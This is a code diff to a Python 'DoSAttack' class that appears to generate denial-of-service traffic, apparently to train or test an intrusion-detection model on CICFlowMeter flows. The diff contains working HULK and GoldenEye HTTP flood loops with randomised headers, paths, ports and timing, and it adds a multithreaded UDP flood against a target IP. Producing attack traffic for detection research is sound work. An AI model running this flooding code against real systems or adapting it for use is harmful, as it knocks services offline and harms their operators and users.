@@ -107,32 +107,47 @@ class DoSAttack:
     def hulk_attack(self):
         """HULK DoS: One HTTP GET request per NEW TCP connection.
         Rapidly opens connections, sends one request, closes.
-        Each CICFlowMeter flow has ~2-3 fwd packets matching training data."""
+        Each CICFlowMeter flow has ~2-3 fwd packets matching training data.
+        
+        VARIATION: Random ports, variable delays, and packet sizes for realism."""
         end_time = time.time() + self.duration
+        # Variation pools for realistic attack patterns
+        ports = [80, 8080, 8888, 3000, 5000, 443]
+        
         while self.running and time.time() < end_time:
             try:
                 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 sock.settimeout(5)
                 sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                 sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, _RCVBUF_HULK)
-                sock.connect((self.target_ip, self.target_port))
+                
+                # VARIATION: Random destination port
+                attack_port = random.choice(ports)
+                sock.connect((self.target_ip, attack_port))
 
-                # Send ONE HTTP GET request per connection (matching training: ~290 bytes fwd)
-                path = "/" + _random_string(8) + _random_url_params(random.randint(2, 6))
-                headers = (
-                    f"GET {path} HTTP/1.1\r\n"
-                    f"Host: {self.target_ip}\r\n"
-                    f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
-                    f"Accept: {random.choice(ACCEPT_TYPES)}\r\n"
-                    f"Accept-Encoding: {random.choice(ACCEPT_ENCODINGS)}\r\n"
-                    f"Accept-Language: en-US,en;q=0.{random.randint(5,9)}\r\n"
-                    f"Referer: {random.choice(REFERERS)}{_random_string(6)}\r\n"
-                    f"Cache-Control: no-cache\r\n"
-                    f"Connection: close\r\n"
-                    f"\r\n"
-                )
-                sock.sendall(headers.encode())
-                self._inc_count()
+                # VARIATION: Variable request size (1-5 requests per connection, weighted to 1)
+                num_reqs = random.choices([1, 2, 3, 4, 5], weights=[70, 15, 10, 3, 2])[0]
+                
+                for _ in range(num_reqs):
+                    path = "/" + _random_string(random.randint(5, 15)) + _random_url_params(random.randint(1, 8))
+                    headers = (
+                        f"GET {path} HTTP/1.1\r\n"
+                        f"Host: {self.target_ip}:{attack_port}\r\n"
+                        f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
+                        f"Accept: {random.choice(ACCEPT_TYPES)}\r\n"
+                        f"Accept-Encoding: {random.choice(ACCEPT_ENCODINGS)}\r\n"
+                        f"Accept-Language: en-US,en;q=0.{random.randint(5,9)}\r\n"
+                        f"Referer: {random.choice(REFERERS)}{_random_string(random.randint(4, 12))}\r\n"
+                        f"Cache-Control: no-cache\r\n"
+                        f"Connection: close\r\n"
+                        f"\r\n"
+                    )
+                    sock.sendall(headers.encode())
+                    self._inc_count()
+                    
+                    # VARIATION: Delay between multiple requests in same connection
+                    if num_reqs > 1:
+                        time.sleep(random.uniform(0.01, 0.1))
 
                 # Read response briefly then close
                 try:
@@ -145,8 +160,8 @@ class DoSAttack:
             except Exception:
                 pass
 
-            # Very short delay — HULK is rapid
-            time.sleep(random.uniform(0.001, 0.02))
+            # VARIATION: Variable delay — more realistic attack pattern
+            time.sleep(random.uniform(0.005, 0.05))
 
     # ──────────────────────────────────────────────────────
     # SLOWLORIS — Hold connections open with incomplete headers
@@ -247,38 +262,46 @@ class DoSAttack:
     # ──────────────────────────────────────────────────────
     def goldeneye_attack(self):
         """GoldenEye DoS: One HTTP GET or POST per NEW TCP connection.
-        Each flow has ~4 fwd packets and ~358 bytes, matching training data."""
+        Each flow has ~4 fwd packets and ~358 bytes, matching training data.
+        
+        VARIATION: Random ports, variable packet sizes for realistic patterns."""
         end_time = time.time() + self.duration
+        ports = [80, 8080, 8888, 3000, 5000, 443]
+        
         while self.running and time.time() < end_time:
             try:
                 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 sock.settimeout(5)
                 sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                 sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, _RCVBUF_GOLDENEYE)
-                sock.connect((self.target_ip, self.target_port))
+                
+                # VARIATION: Random destination port
+                attack_port = random.choice(ports)
+                sock.connect((self.target_ip, attack_port))
 
-                # Send ONE GET or POST request per connection
-                if random.random() < 0.5:
+                # VARIATION: GET vs POST, variable sizes
+                if random.random() < 0.6:
                     # GET with cache busting
-                    path = "/" + _random_string(6) + _random_url_params(random.randint(3, 8))
+                    path = "/" + _random_string(random.randint(4, 12)) + _random_url_params(random.randint(2, 10))
                     req = (
                         f"GET {path} HTTP/1.1\r\n"
-                        f"Host: {self.target_ip}\r\n"
+                        f"Host: {self.target_ip}:{attack_port}\r\n"
                         f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
                         f"Accept: {random.choice(ACCEPT_TYPES)}\r\n"
-                        f"Referer: {random.choice(REFERERS)}{_random_string(6)}\r\n"
+                        f"Referer: {random.choice(REFERERS)}{_random_string(random.randint(4, 12))}\r\n"
                         f"Cache-Control: no-store, no-cache\r\n"
                         f"Pragma: no-cache\r\n"
                         f"Connection: close\r\n"
                         f"\r\n"
                     )
                 else:
-                    # POST with random body (moderate size, ~358 bytes total)
-                    body = _random_string(random.randint(64, 256))
-                    path = "/" + _random_string(6) + _random_url_params(2)
+                    # POST with variable body size (50-400 bytes for variation)
+                    body_size = random.randint(50, 400)
+                    body = _random_string(body_size)
+                    path = "/" + _random_string(random.randint(4, 10)) + _random_url_params(random.randint(1, 4))
                     req = (
                         f"POST {path} HTTP/1.1\r\n"
-                        f"Host: {self.target_ip}\r\n"
+                        f"Host: {self.target_ip}:{attack_port}\r\n"
                         f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
                         f"Content-Type: application/x-www-form-urlencoded\r\n"
                         f"Content-Length: {len(body)}\r\n"
@@ -300,8 +323,8 @@ class DoSAttack:
             except Exception:
                 pass
 
-            # Short delay between connections
-            time.sleep(random.uniform(0.005, 0.05))
+            # VARIATION: Variable delay for realistic spacing
+            time.sleep(random.uniform(0.01, 0.1))
 
     # ──────────────────────────────────────────────────────
     # SlowHTTPTest — Slow POST body transmission
@@ -361,10 +384,40 @@ class DoSAttack:
             except Exception:
                 pass
 
+    # ──────────────────────────────────────────────────────
+    # UDP FLOOD — Protocol diversity (not just TCP)
+    #   Sends random UDP packets to various ports.
+    #   Creates flows with protocol=17 (UDP), variable sizes.
+    # ──────────────────────────────────────────────────────
+    def udp_flood(self):
+        """UDP Flood: Send random UDP packets to various ports.
+        Adds protocol diversity to the attack traffic (not just TCP/80)."""
+        end_time = time.time() + self.duration
+        udp_ports = [53, 123, 161, 162, 514, 1900, 5353, 19132, 27015]
+        
+        while self.running and time.time() < end_time:
+            try:
+                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                sock.settimeout(3)
+                
+                # VARIATION: Random UDP port and payload size
+                attack_port = random.choice(udp_ports)
+                payload_size = random.randint(10, 1500)
+                payload = _random_string(payload_size)
+                
+                sock.sendto(payload.encode(), (self.target_ip, attack_port))
+                self._inc_count()
+                sock.close()
+            except Exception:
+                pass
+            
+            # Variable inter-packet timing
+            time.sleep(random.uniform(0.001, 0.05))
+
     def run_attack(self, num_threads=5):
-        """Run DoS attack with multiple threads across all four techniques."""
+        """Run DoS attack with multiple threads across all techniques."""
         print(f"[DoS] Starting attack on {self.target_ip}:{self.target_port} for {self.duration}s")
-        print(f"[DoS] Techniques: Hulk + Slowloris + GoldenEye + SlowHTTPTest")
+        print(f"[DoS] Techniques: Hulk + Slowloris + GoldenEye + SlowHTTPTest + UDP Flood")
         print(f"[DoS] Using {num_threads} threads")
 
         techniques = [
@@ -372,6 +425,7 @@ class DoSAttack:
             self.slowloris_attack,
             self.goldeneye_attack,
             self.slowhttp_attack,
+            self.udp_flood,
         ]
 
         threads = []
